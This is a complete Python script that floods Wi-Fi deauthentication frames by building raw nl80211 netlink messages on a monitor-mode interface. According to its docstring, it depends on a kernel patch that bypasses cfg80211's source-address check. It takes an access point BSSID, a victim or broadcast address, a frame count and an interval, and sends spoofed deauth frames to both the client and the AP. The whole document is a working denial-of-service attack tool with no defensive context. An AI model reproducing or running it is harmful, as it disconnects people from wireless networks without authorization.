#!/usr/bin/env python3
"""
Deauth injection via nl80211 CMD_FRAME on monitor mode.
Requires kpatch3 loaded (SA check bypassed in cfg80211_mlme_mgmt_tx).
Fire-and-forget approach - no ACK waiting.
"""
import socket, struct, fcntl, sys, time, select

NETLINK_GENERIC = 16
NLM_F_REQUEST = 1
NLM_F_ACK = 4

def get_nl80211_family_id():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))
    attr = struct.pack('HH', 12, 2) + b'nl80211\0'
    genlhdr = struct.pack('BBH', 3, 1, 0)
    nlhdr = struct.pack('IHHII', 16+len(genlhdr)+len(attr), 16, NLM_F_REQUEST|NLM_F_ACK, 1, 0)
    s.send(nlhdr + genlhdr + attr)
    resp = s.recv(4096)
    off = 20
    nllen = struct.unpack_from('I', resp, 0)[0]
    while off < nllen:
        alen, atype = struct.unpack_from('HH', resp, off)
        if atype == 1:
            fid = struct.unpack_from('H', resp, off+4)[0]
            s.close()
            return fid
        off += (alen+3) & ~3
    s.close()
    return None

def get_ifindex(ifname):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    result = fcntl.ioctl(sock.fileno(), 0x8933, struct.pack('256s', ifname.encode()))
    sock.close()
    return struct.unpack('i', result[16:20])[0]

def nla(atype, data):
    alen = 4 + len(data)
    padded = (alen+3) & ~3
    return struct.pack('HH', alen, atype) + data + b'\0'*(padded-alen)

def build_deauth_msg(fid, ifidx, freq, da, sa, bssid, reason, seq_num):
    frame = struct.pack('<HH', 0x00c0, 0)
    frame += da + sa + bssid
    frame += struct.pack('<HH', (seq_num & 0xfff) << 4, reason)

    attrs = nla(3, struct.pack('I', ifidx))
    attrs += nla(38, struct.pack('I', freq))
    attrs += nla(51, frame)
    attrs += struct.pack('HH', 4, 118)  # DONT_WAIT_FOR_ACK
    genlhdr = struct.pack('BBH', 59, 1, 0)
    payload = genlhdr + attrs
    nlhdr = struct.pack('IHHII', 16+len(payload), fid, NLM_F_REQUEST, seq_num+100, 0)
    return nlhdr + payload

def drain_errors(sock):
    """Non-blocking read of any error responses."""
    errors = 0
    while True:
        r, _, _ = select.select([sock], [], [], 0)
        if not r:
            break
        try:
            resp = sock.recv(4096)
            nltype = struct.unpack_from('H', resp, 4)[0]
            if nltype == 2:
                errno = struct.unpack_from('i', resp, 16)[0]
                if errno != 0:
                    errors += 1
                    if errors <= 3:
                        print(f"    ERROR: errno={errno}")
        except:
            break
    return errors

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <iface> <bssid> [freq] [target] [count] [interval]")
        sys.exit(1)

    iface = sys.argv[1]
    bssid = bytes.fromhex(sys.argv[2].replace(':', ''))
    freq = int(sys.argv[3]) if len(sys.argv) > 3 else 2412
    target = bytes.fromhex(sys.argv[4].replace(':', '')) if len(sys.argv) > 4 else b'\xff\xff\xff\xff\xff\xff'
    count = int(sys.argv[5]) if len(sys.argv) > 5 else 100
    interval = float(sys.argv[6]) if len(sys.argv) > 6 else 0.05

    fid = get_nl80211_family_id()
    ifidx = get_ifindex(iface)
    print(f"[*] {iface} idx={ifidx} fid={fid}")
    print(f"[*] AP: {bssid.hex(':')} freq={freq} target: {target.hex(':')}")
    print(f"[*] Sending {count} deauth frames (interval={interval}s)...")

    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))
    s.setblocking(False)

    total_errors = 0
    broadcast = b'\xff\xff\xff\xff\xff\xff'

    for i in range(count):
        msg = build_deauth_msg(fid, ifidx, freq, target, bssid, bssid, 7, i*2)
        try:
            s.send(msg)
        except BlockingIOError:
            time.sleep(0.01)
            s.send(msg)

        if target != broadcast:
            msg2 = build_deauth_msg(fid, ifidx, freq, bssid, target, bssid, 8, i*2+1)
            try:
                s.send(msg2)
            except BlockingIOError:
                time.sleep(0.01)
                s.send(msg2)

        # Periodically drain errors
        if (i+1) % 10 == 0:
            total_errors += drain_errors(s)

        if (i+1) % 25 == 0:
            print(f"  [{i+1}/{count}] errors_so_far={total_errors}")

        time.sleep(interval)

    # Final drain
    time.sleep(0.5)
    total_errors += drain_errors(s)

    s.close()
    print(f"[*] Done: {count} sent, {total_errors} errors detected")

if __name__ == '__main__':
    main()
